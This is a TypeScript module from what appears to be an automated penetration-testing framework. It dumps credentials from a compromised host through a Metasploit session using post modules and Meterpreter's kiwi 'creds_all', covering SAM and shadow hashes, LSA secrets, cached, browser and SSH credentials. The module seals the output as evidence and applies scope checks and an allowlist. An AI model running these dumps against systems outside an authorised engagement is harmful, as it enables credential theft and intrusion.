/**
 * Credential dumping for the MSF executor (W8): gather credential
 * material from an in-scope host through its open session and SEAL the
 * raw output into the engagement evidence store.
 *
 * The perimeter is the session perimeter (executor/session-ops.ts):
 * exact scope preflight, runner-issued handle bound to the
 * exploited host, post modules limited to the policy allowlist and
 * pinned to the open session. The tool result carries counts, types, the
 * evidence reference and a sha256 — the raw material never enters the
 * result, the event log, or the transcript.
 */

import { createHash } from "node:crypto";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { redactSecrets } from "../../host-exec/common.js";
import { checkMsfModule } from "../policy.js";
import { authedClient } from "./auth.js";
import type { MsfResult } from "./executor.js";
import { gateSession, type SessionOpsHost } from "./session-ops.js";

const SESSION_CMD_TIMEOUT_MS = 30_000;
const DUMP_TIMEOUT_MS = 60_000;

export interface CredentialDumpArgs {
  host: string;
  scopeHosts: string[];
  handle: string;
  kind: string;
  evidenceDir: string;
  timeoutMs?: number;
  signal?: AbortSignal;
}

export interface DumpKindSpec {
  /** Post module (with prefix) — absent for kiwi, which is a session extension. */
  module?: string;
  types: string[];
}

/** Credential-dump kinds the tool exposes. Post modules are the policy allowlist; kiwi runs through the session. */
export const DUMP_KINDS: Record<string, DumpKindSpec> = {
  hashdump: { module: "post/windows/gather/hashdump", types: ["sam-hash"] },
  smart_hashdump: { module: "post/windows/gather/smart_hashdump", types: ["sam-hash"] },
  cachedump: { module: "post/windows/gather/cachedump", types: ["cached-credential"] },
  lsa_secrets: { module: "post/windows/gather/lsa_secrets", types: ["lsa-secret"] },
  credential_collector: { module: "post/windows/gather/credentials/credential_collector", types: ["os-credential-store"] },
  gpp: { module: "post/windows/gather/credentials/gpp", types: ["gpp-cpassword"] },
  chrome: { module: "post/windows/gather/enum_chrome", types: ["browser-credential"] },
  firefox: { module: "post/multi/gather/firefox_creds", types: ["browser-credential"] },
  ssh_creds: { module: "post/multi/gather/ssh_creds", types: ["ssh-credential"] },
  linux_hashdump: { module: "post/linux/gather/hashdump", types: ["shadow-hash"] },
  kiwi: { types: ["kiwi-credential"] },
};

export function dumpKindNames(): string[] {
  return Object.keys(DUMP_KINDS);
}

const SAM_LINE_RE = /^[^\s:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::.*$/gim;
const SECRET_PAIR_RE = /^\s*(password|passwd|pwd|hash|ntlm|secret)\s*[:=]/gim;

/** Count credential records in raw dump output (SAM lines + labelled secret pairs). */
export function countCredentialRecords(raw: string): number {
  const sam = raw.match(SAM_LINE_RE)?.length ?? 0;
  const pairs = raw.match(SECRET_PAIR_RE)?.length ?? 0;
  return sam + pairs;
}

/**
 * Gather credential material through an open session and seal it.
 * See the header for the result contract (refs only, never raw).
 */
export async function credentialDump(
  host: SessionOpsHost,
  args: CredentialDumpArgs,
): Promise<MsfResult> {
  const started = Date.now();
  const spec = DUMP_KINDS[args.kind];
  if (!spec) {
    return host.refusedResult(
      args.host,
      `unknown credential dump kind ${JSON.stringify(args.kind)} — known kinds: ${dumpKindNames().join(", ")}`,
    );
  }
  const gate = gateSession(host, args);
  if ("refused" in gate) return gate.refused;
  if (spec.module) {
    const deniedModule = checkMsfModule(spec.module, "post", { testMode: host.testMode });
    if (deniedModule) return host.refusedResult(args.host, deniedModule);
  }
  try {
    const { client, secrets } = await authedClient(host.deps, DUMP_TIMEOUT_MS, args.signal);
    let raw: string;
    if (!spec.module) {
      // Kiwi is a Meterpreter extension, not a post module: load it and
      // pull every credential class through the session channel itself.
      const load = await host.sessions.exec(client, args.handle, "load kiwi", {
        timeoutMs: SESSION_CMD_TIMEOUT_MS,
        signal: args.signal,
      });
      const creds = await host.sessions.exec(client, args.handle, "creds_all", {
        timeoutMs: args.timeoutMs ?? DUMP_TIMEOUT_MS,
        signal: args.signal,
      });
      raw = `${load.output}\n${creds.output}`;
    } else {
      const res = await client.runModuleConsole({
        moduleType: "post",
        fullname: spec.module.replace(/^post\//, ""),
        options: { SESSION: gate.record.daemonId },
        timeoutMs: args.timeoutMs ?? DUMP_TIMEOUT_MS,
        signal: args.signal,
      });
      if (res.aborted) {
        return {
          ok: false,
          transport: "msf",
          host: args.host,
          summary: "msf credential dump ABORTED by call signal (console destroyed) — nothing sealed",
          output: "",
          ms: Date.now() - started,
        };
      }
      raw = res.output;
    }
    const records = countCredentialRecords(raw);
    const sha256 = createHash("sha256").update(raw).digest("hex");
    mkdirSync(args.evidenceDir, { recursive: true });
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    const dataPath = join(args.evidenceDir, `msf-credential-dump-${args.kind}-${stamp}.txt`);
    writeFileSync(dataPath, raw, { mode: 0o600 });
    const manifestPath = `${dataPath}.json`;
    writeFileSync(
      manifestPath,
      JSON.stringify(
        {
          kind: args.kind,
          module: spec.module ?? "meterpreter-extension:kiwi",
          targetHost: args.host,
          sessionHandle: gate.record.handle,
          daemonSessionId: gate.record.daemonId,
          records,
          types: spec.types,
          sha256,
          sealedAt: new Date().toISOString(),
        },
        null,
        2,
      ) + "\n",
      { mode: 0o600 },
    );
    return {
      ok: true,
      transport: "msf",
      host: args.host,
      summary: redactSecrets(
        `msf credential dump (${args.kind}) on ${args.host}: ${records} credential record(s) sealed to evidence ${dataPath} (sha256 ${sha256.slice(0, 16)}…) — raw material is in the evidence store only, never the transcript`,
        secrets,
      ),
      output: "",
      ms: Date.now() - started,
      session: { handle: gate.record.handle, daemonId: gate.record.daemonId },
      evidence: { path: dataPath, sha256, records, types: [...spec.types] },
    };
  } catch (err) {
    return {
      ok: false,
      transport: "msf",
      host: args.host,
      summary: `msf credential dump failed: ${(err as Error).message}`.slice(0, 300),
      output: "",
      ms: Date.now() - started,
    };
  }
}
